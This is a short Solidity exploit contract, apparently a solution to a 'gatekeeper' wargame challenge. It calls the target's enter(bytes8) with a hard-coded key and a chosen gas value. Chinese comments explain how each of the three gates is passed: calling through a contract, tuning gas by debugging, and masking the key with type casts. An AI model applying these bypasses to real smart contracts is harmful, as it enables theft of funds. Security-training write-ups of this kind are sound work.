pragma solidity ^0.8.0;

contract Hack{
    constructor() public {}

    function sendTo(address add,uint gasSend) public {
        uint64 key;
        key = 0xffffffff0000502B;
        bytes memory data = abi.encodeWithSignature("enter(bytes8)",bytes8(key));
        (bool success, ) = add.call{gas:gasSend}(data);
        require(success);
    }
}

// gatekeeper1 ： 合约调用合约即可
// gatekeeper2 ： 需要debug一下，找到gas指令的地方，gas指令需要2gas，所以算一下即可
// gatekeeper3 ： uint16强制类型转换=(&0xffff)，bytesN强制类型转换=(shr (len(source)-N)*8)